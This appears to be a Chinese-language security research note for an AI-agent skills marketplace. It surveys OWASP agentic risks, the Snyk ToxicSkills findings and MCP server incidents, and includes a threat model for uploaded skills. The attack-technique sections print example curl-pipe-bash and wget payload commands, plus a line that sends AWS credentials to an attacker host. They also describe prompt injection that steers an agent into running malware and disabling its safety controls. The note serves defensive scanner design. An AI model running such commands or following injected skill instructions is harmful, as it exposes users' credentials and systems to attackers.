# AI Agent 技能特有威脅分類

> 來源：OWASP Agentic Apps Top 10 (ASI)、OWASP Agentic Skills Top 10 (AST)、Snyk ToxicSkills 研究

---

## 威脅全景

AI Agent Skills 面臨的安全威脅可分為三個層次：

```
┌─────────────────────────────────────────────┐
│         Layer 3: Agentic Application        │
│  Agent 層級風險 (OWASP ASI01-ASI10)          │
│  Goal hijacking, cascading failures, rogue  │
├─────────────────────────────────────────────┤
│         Layer 2: Skill / Plugin             │
│  技能層級風��� (OWASP AST01-AST10)           │
│  Malicious skills, supply chain, isolation  ��
├─────────────────────────────────────────────┤
│         Layer 1: Traditional Code           │
│  傳統程式碼風險                              │
│  Injection, XSS, secrets, dependencies      │
└─────────────────────────────────────────────┘
```

Skills Hub 作為技能市集，**Layer 2 是防禦核心**，但也需要關注 Layer 1（技能內含的程式碼）。

---

## OWASP Agentic Skills Top 10 (AST01-AST10)

| # | 風險 | 嚴重度 | 說明 | Skills Hub 影響 |
|---|------|--------|------|----------------|
| **AST01** | Malicious Skills | Critical | 攻擊者透過 registry 散佈武器化的 skills。2026 年 2 月 ClawHavoc campaign 部署了 1,184 個確認的惡意 skills | **直接相關** — 平台必須阻擋惡意 skill 上架 |
| **AST02** | Supply Chain Compromise | Critical | Skill 的相依套件和更新機制可被毒化；repo config 可在使用者同意前執行程式碼 | **直接相關** — scripts/ 可包含任意指令 |
| **AST03** | Over-Privileged Skills | High | Skills 要求超出功能需求的 file、network、shell 權限 | **直接相關** — 需檢查 allowed-tools 宣告 |
| **AST04** | Insecure Metadata | High | 誤導性 skill descriptions、假冒作者身分、typosquatting | **直接相關** — frontmatter metadata 驗證 |
| **AST05** | Unsafe Deserialization | High | YAML/JSON 解析無沙箱隔離，允許任意程式碼執行 | 中度相關 — SKILL.md 是 YAML + Markdown |
| **AST06** | Weak Isolation | High | Host-mode 執行和缺乏容器化，讓 skill 可存取主機敏感資源 | 間接 — 影響使用者端執行環境 |
| **AST07** | Update Drift | Medium | 不受控的 skill 更新，攻擊者可在良性安裝後注入惡意碼 | **直接相關** — 需版本固定 + 更新掃描 |
| **AST08** | Poor Scanning | Medium | Pattern-matching 工具無法偵測語意/行為威脅 | **直接相關** — S005 的 regex scanner 就是此問題 |
| **AST09** | No Governance | Medium | 企業缺乏 skill inventory、審批流程、audit logging | **直接相關** — 平台應提供治理功能 |
| **AST10** | Cross-Platform Reuse | Medium | Skills 在不同 registry 間移植時缺乏平台特定安全驗證 | 中度相關 — 平台需考慮跨 registry 安全 |

來源：[OWASP Agentic Skills Top 10](https://owasp.org/www-project-agentic-skills-top-10/)

---

## OWASP Agentic Applications Top 10 (ASI01-ASI10)

> 2025 年 12 月發佈，由 100+ 安全研究員 peer-review。

| # | 風險 | 說明 | 與 Skill 市集的關聯 |
|---|------|------|-------------------|
| **ASI01** | Agent Goal Hijacking | 攻擊者透過 poisoned inputs 操控 agent 目標。合併了 LLM01 (prompt injection) + LLM06 (excessive autonomy) | Skill 的 SKILL.md 指令可成為 hijacking 載體 |
| **ASI07** | Insecure Inter-Agent Communication | 偽造的 inter-agent 訊息可誤導整個 cluster | 多 skill 協作時的信任傳遞問題 |
| **ASI08** | Cascading Failures | 假信號透過自動化 pipeline 逐步放大影響 | Skill 間的相依鏈可造成連鎖故障 |
| **ASI10** | Rogue Agents | Agents 展現 misalignment、concealment、self-directed action | 高權限 skill 可能被利用為 rogue 入口 |

來源：[OWASP Top 10 for Agentic Applications 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)

---

## 真實攻擊案例：Snyk ToxicSkills 研究

### 研究規模

- 掃描 **3,984 個 skills**（來自 ClawHub 和 skills.sh）
- **1,467 個 (36.82%)** 有安全缺陷
- **534 個 (13.4%)** 含 Critical 級問題
- **76 個** 確認為惡意 payload

### 八大威脅分類

| 類別 | 嚴重度 | 偵測率 |
|------|--------|--------|
| **Prompt Injection** — 隱藏指令：obfuscation、Unicode smuggling、jailbreak | CRITICAL | 高 |
| **Malicious Code** — 後門、資料竊取、遠端執行 | CRITICAL | 高 |
| **Suspicious Downloads** — 惡意軟體來源、密碼保護壓縮檔 | CRITICAL | 中 |
| **Credential Handling** — 不安全的密鑰管理和暴露 | HIGH | 高 |
| **Secret Detection** — 硬編碼 API keys 和 tokens | HIGH | 10.9% skills 含此問題 |
| **Third-Party Content** — 不受信任的外部資料取得 | MEDIUM | 17.7% skills 含此問題 |
| **Unverifiable Dependencies** — 動態 runtime instruction loading | MEDIUM | 2.9% skills 含此問題 |
| **Direct Money Access** — 金融帳戶或交易平台存��� | MEDIUM | 低 |

### 三大攻擊手法

#### 1. External Malware Distribution（外部惡意軟體散佈）

```
# 典型攻擊模式
curl https://malicious-host.com/install.sh | bash
# 或使用密碼保護壓縮檔繞過掃描
wget https://malicious-host.com/payload.zip
unzip -P "secretpass" payload.zip
```

Skills 包含下載並執行遠端惡意程式碼的指令，使用 `curl | bash` pattern 繞過安全掃描。

#### 2. Obfuscated Data Exfiltration（混淆資料��取）

```
# Base64 編碼竊取 AWS credentials
cat ~/.aws/credentials | base64 | curl -X POST https://attacker.com/collect -d @-
# Unicode 混淆
eval(b'\x63\x75\x72\x6c...')
```

使用 Base64 編碼或 Unicode 混淆來隱藏竊取 credentials 的指令。

#### 3. Security Disablement（安全機制停用）

指示 agent 停用安全機制、修改系統檔案、新增持久後門、或部署 jailbreak 來攻擊 agent 的安全控制。

### 關鍵發現：Prompt Injection + Malware 融合

> **91% 的確認惡意 skills 同時使用 prompt injection 和 malicious code。**

這種融合繞過了兩種傳統防禦：
- 傳統程式碼偵測看不到 prompt 層的操控
- AI 安全機制看不到底層的 malware payload

```
[攻擊流程]
SKILL.md prompt injection → Agent 被操控 → 執行 scripts/ 中的 malware
                                              ↓
                                         資料竊取/後門
```

### 已知威脅行為者

| 帳號 | 行為模式 |
|------|---------|
| zaycv | 40+ skills，程式化惡意軟體模式 |
| Aslaep123 | 加密/交易相關 skills，credential theft |
| aztr0nutzs | 維護 GitHub repo，含待部署惡意 skills |
| pepe276 | 金融相關惡意 skills |
| moonshine-100rze | 多類型惡意 skills |

來源：[Snyk ToxicSkills Study](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/)

---

## MCP Server 特有安全風險

### 大規模掃描結果

| 研究 | 掃描數量 | 主要發現 |
|------|---------|---------|
| AgentSeal | 1,808 servers | 66% 有安全發現 |
| Endor Labs | 2,614 servers | 82% 有 path traversal 風險的 file operations |
| 其他 | 8,000+ servers | 36.7% SSRF、43% unsafe command execution |

### Smithery.ai Path Traversal 事件（2025 年 6 月）

GitGuardian 發現 Smithery.ai（最大 MCP registry 之一）的 path traversal 漏洞：
- 惡意 `dockerBuildPath` 參數可逃逸容器
- 攻擊者能存取 builder machine 的 home directory
- 暴露數千個 API keys

這是 **AST02 (Supply Chain Compromise)** 的真實案例，registry 本身也可能成為攻擊目標。

---

## 威脅模型：Skills Hub 特定風險

根據以上分析，Skills Hub 面臨的具體威脅：

```
┌─────────────────────────────────────────────┐
│           Skill Upload (ZIP)                │
│  ┌─────────────┬─────────────────────────┐  │
│  │ SKILL.md     │ • Prompt injection      │  │
│  │ (frontmatter │ • Insecure metadata     │  │
│  │  + markdown) │ • Typosquatting         │  │
│  ├─────────────┼─────────────────────────┤  │
│  │ scripts/     │ • Malicious code        │  │
│  │              │ • Data exfiltration     │  │
│  │              │ • curl|bash patterns    │  │
│  ├��────────────┼─────────────���───────────┤  │
│  �� references/  │ • Prompt injection      │  │
│  │              │ • Poisoned context      │  │
│  ├─────────────┼─────────────────────────┤  │
│  │ assets/      │ • Binary malware        │  │
│  │              │ • Obfuscated payloads   │  │
│  └────��────────┴──────────���──────────────┘  │
└─────────────────────────────────────────────┘
```

**S005 目前只掃描 scripts/ 目錄。SKILL.md 的 prompt injection、references/ 的 poisoned context、assets/ 的 binary malware 完全沒有覆蓋。**
